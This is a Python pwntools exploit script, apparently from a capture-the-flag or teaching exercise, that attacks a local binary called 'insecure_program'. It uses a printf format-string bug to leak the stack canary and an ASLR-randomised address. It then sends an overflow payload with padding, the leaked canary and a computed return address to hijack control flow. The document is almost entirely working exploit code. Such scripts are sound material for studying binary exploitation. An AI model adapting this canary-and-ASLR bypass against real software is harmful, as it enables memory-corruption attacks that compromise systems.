from pwn import *
import struct

# Open up our 'secure' program
p = process('./insecure_program')

# Exploit format string vuln from printf
first_payload = "A"*16
first_payload += " %p %p %p %p %13$p %14$p"

# Send to stdin and retrieve reply
p.sendline(first_payload)
reply = p.recvline(timeout=2)

# Leak out addresses into list
addresses = reply.split()[4:]
print("\n[+] Leaked Addresses: " + str(addresses))

# Retrieve stack canary value from leaked addresses
def find_canary():
	hex_address = addresses[4]
	print("[+] Stack Canary Found: " + hex_address)
	
   	# This converts to hex bytes in little endian format
	hex_bytes = struct.pack("<Q", int(hex_address,16))

	return hex_bytes


# Retrieve aslr randomised address
def find_aslr_address():
	# Use current addresses to determine random address created by ASLR
	aslr_address = addresses[5][:11]
	
	# Add more zeroes
	aslr_address = aslr_address[:2] + "0000" + aslr_address[2:]
	print("[+] ASLR Address: " + aslr_address)

	# This offset is not random and will always be the same regardless of ASLR
	aslr_address += "7ca"
	print("[+] ASLR Return Address: " + aslr_address) 
	aslr_hex_bytes = struct.pack("<Q", int(aslr_address,16))

	return aslr_hex_bytes


canary = find_canary()
return_address = find_aslr_address()

# Create some padding using 'B's 
second_payload = "B"*55
# Add the canary value
second_payload += canary
# Create more padding to lead to return address
second_payload += "B"*8
# Finally inject our own return address for code redirection
second_payload += return_address
print("[+] Payload Generated: " + second_payload + "\n")

# Send to stdin again
p.sendline(second_payload)
second_reply = p.recvall(timeout=2)
print(second_reply)

